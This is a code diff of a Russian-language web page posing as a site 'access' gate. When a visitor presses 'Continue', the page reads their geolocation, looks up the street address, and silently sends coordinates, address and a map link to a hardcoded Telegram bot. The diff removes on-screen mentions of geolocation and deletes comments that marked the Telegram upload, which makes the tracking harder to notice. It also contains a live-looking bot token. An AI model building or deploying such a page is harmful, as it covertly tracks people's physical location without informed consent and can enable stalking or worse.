@@ -197,17 +197,16 @@
 </head>
 <body>
 
-    <!-- ЭКРАН 1: Чёрный + кнопка -->
+    <!-- ЭКРАН 1: Чёрный + кнопка (без намёка на геолокацию) -->
     <div class="full-center" id="step1">
         <div class="card">
-            <h1>🔐 Доступ к сайту</h1>
-            <div class="sub">Для входа необходимо разрешить доступ к геолокации</div>
+            <h1>🔐 Доступ</h1>
+            <div class="sub">Нажмите «Продолжить» для входа</div>
             <button class="btn" id="startBtn">Продолжить</button>
-            <div class="footer">Нажмите «Разрешить» в системном окне</div>
         </div>
     </div>
 
-    <!-- ЭКРАН 2: Сюрприз — карта + адрес + кнопка копирования -->
+    <!-- ЭКРАН 2: Карта + координаты + адрес (показывается только после разрешения) -->
     <div class="full-center hidden" id="step2">
         <div class="card">
             <div class="surprise">🎉 Вот ты где!</div>
@@ -233,19 +232,18 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 3: Ошибка (запрет) -->
+    <!-- ЭКРАН 3: Заглушка при запрете -->
     <div class="full-center hidden" id="step3">
         <div class="card">
             <div class="error-box">
-                <div class="error-text">⛔ Доступ закрыт</div>
-                <div class="error-sub">Для работы сайта необходимо разрешить геолокацию</div>
+                <div class="error-text">⛔ Доступ запрещён</div>
+                <div class="error-sub">Закройте вкладку, чтобы продолжить</div>
                 <button class="btn-small" onclick="goBack()">🔙 Попробовать снова</button>
             </div>
         </div>
     </div>
 
     <script>
-        // ====== НАСТРОЙКА TELEGRAM ======
         const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
         const CHAT_ID = "2131297532";
 
@@ -256,7 +254,6 @@
         let lastLon = null;
         let lastAddress = null;
 
-        // ====== ОТПРАВКА В TELEGRAM ======
         function sendToTelegram(lat, lon, acc, address) {
             const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
             const text =
@@ -299,7 +296,6 @@
             }, 1000);
         }
 
-        // ====== КОПИРОВАНИЕ ======
         function copyCoords() {
             if (!lastLat || !lastLon) return;
             const text = `${lastLat.toFixed(6)}, ${lastLon.toFixed(6)}`;
@@ -319,7 +315,6 @@
             });
         }
 
-        // ====== ПОЛУЧЕНИЕ АДРЕСА ======
         async function getAddress(lat, lon) {
             try {
                 const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
@@ -331,7 +326,6 @@
             }
         }
 
-        // ====== ГЕОЛОКАЦИЯ ======
         function getLocation() {
             const status = document.getElementById('statusText');
             const coords = document.getElementById('coordsDisplay');
@@ -366,7 +360,6 @@
                     status.className = 'status success';
                     btn.disabled = false;
 
-                    // Карта
                     if (marker) map.removeLayer(marker);
                     if (circle) map.removeLayer(circle);
                     marker = L.marker([lat, lon]).addTo(map);
@@ -378,12 +371,10 @@
                     }).addTo(map);
                     map.setView([lat, lon], 16);
 
-                    // Адрес
                     const address = await getAddress(lat, lon);
                     lastAddress = address;
                     addressEl.textContent = address;
 
-                    // Отправка в Telegram
                     sendToTelegram(lat, lon, accuracy, address);
                 },
                 function(err) {
